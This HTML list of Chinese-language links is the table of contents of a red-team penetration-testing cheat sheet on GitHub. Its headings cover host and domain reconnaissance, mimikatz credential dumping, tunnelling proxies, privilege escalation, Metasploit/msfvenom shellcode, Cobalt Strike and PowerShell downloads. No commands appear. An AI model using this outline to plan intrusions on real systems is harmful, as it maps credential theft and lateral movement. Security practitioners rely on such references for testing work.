<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%AF%BC%E5%87%BA%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF">导出日志信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Bhosts%E6%96%87%E4%BB%B6">查看hosts文件</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF">查看中间件信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%BB%84%E7%AD%96%E7%95%A5-gpresult">查看组策略 gpresult</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8%E9%A1%B9">查看启动项</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81-mimikatz">抓取密码 mimikatz</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81">浏览器密码</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%94%B6%E7%AB%99">查看回收站</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E4%BF%A1%E6%81%AF-nltestnet">查看域信息 nltest&#x2F;net</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">Linux信息收集</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF">操作系统基本信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF">系统环境信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF">系统服务信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF">系统软件信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BD%9C%E4%B8%9A">系统任务和作业</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%92%8C%E7%BB%84%E4%BF%A1%E6%81%AF">用户信息和组信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF">用户和权限信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%92%8C%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF">系统网络和路由信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF">获取其他信息</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">域内信息收集</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F">判断是否存在域</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ipconfig">ipconfig</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF-systeminfo">查看系统详细信息 systeminfo</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%99%BB%E5%BD%95%E5%9F%9F%E4%B8%8E%E5%9F%9F%E7%94%A8%E6%88%B7-netconfig">查看当前登录域与域用户 netconfig</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%88%A4%E6%96%AD%E4%B8%BB%E5%9F%9F-net-time">判断主域 net time</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF">收集域内基础信息</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F-net-view">查看域 net view</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E8%AE%A1%E7%AE%97%E6%9C%BA-net-view">查看域内计算机 net view</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E7%BB%84%E5%88%97%E8%A1%A8-net-group">查看域内用户组列表 net group</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8-net-group">查看域管理员列表 net group</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8-net-group">查看企业管理员列表 net group</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E7%BD%AEadministrator%E7%BB%84%E7%94%A8%E6%88%B7">查看域内置administrator组用户</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E4%BF%A1%E6%81%AF-net-accounts">查看域密码策略信息 net accounts</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%BF%A1%E6%81%AF-nltest">查看域信任信息 nltest</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%94%B6%E9%9B%86%E5%9F%9F%E7%94%A8%E6%88%B7%E5%92%8C%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF">收集域用户和管理员信息</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8-net-user">查询域用户列表 net user</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF-wmic-useraccount">查询域用户详细信息 wmic useraccount</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E8%AF%A2%E5%AD%98%E5%9C%A8%E7%9A%84%E7%94%A8%E6%88%B7">查询存在的用户</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%94%B6%E9%9B%86%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E4%BF%A1%E6%81%AF">收集域控制器信息</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E4%B8%BB%E6%9C%BA%E5%90%8D">查看域控主机名</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%88%97%E8%A1%A8-net-group">查看域控制器列表 net group</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B">查找域管理员进程</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8">获取域管理员列表</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%88%97%E5%87%BA%E6%9C%AC%E6%9C%BA%E7%9A%84%E6%89%80%E6%9C%89%E8%BF%9B%E7%A8%8B%E5%8F%8A%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7">列出本机的所有进程及进程用户</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98">定位域管理员</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#psloggedon%E6%9F%A5%E8%AF%A2">psloggedon查询</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#netview%E6%9F%A5%E8%AF%A2">netview查询</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%BB%A3%E7%90%86">内网穿透代理</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#neo-regeorg">Neo-reGeorg</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ssh">ssh</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#nps">nps</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#frp">frp</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">内网权限提升</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83">Windows系统提权</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83">Linux系统提权</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7">内网渗透工具</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#cobaltstrike">CobaltStrike</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#metasploit">Metasploit</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfconsole%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97auxiliary">msfconsole辅助模块（Auxiliary）</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfconsole%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97-post">msfconsole后渗透攻击模块 (Post)</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfconsole%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97exploit">msfconsole渗透攻击模块（Exploit）</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfenvom%E7%94%9F%E6%88%90shell-code">msfenvom生成shell code</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfenvom%E7%94%9F%E6%88%90%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">msfenvom生成可执行文件</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">Meterpreter常用命令</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%90%84%E7%A7%8Dshell%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2">各种shell的相互转换</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msf%E6%B4%BE%E7%94%9Fshell%E7%BB%99cobalt-strike">msf派生shell给cobalt Strike</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#cobalt-strike%E8%81%94%E5%8A%A8msf">cobalt Strike联动msf</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#command-shell%E8%BD%ACmeterpreter">command shell转meterpreter</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#meterpreter%E8%BD%ACcommand-shell">meterpreter转command shell</a></li>
</ul>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4">内网其他命令</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#3389%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE">3389端口开放</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#powershell%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">powershell文件下载</a></li>
</ul>
</li>
</ul>
</li>
</ul>
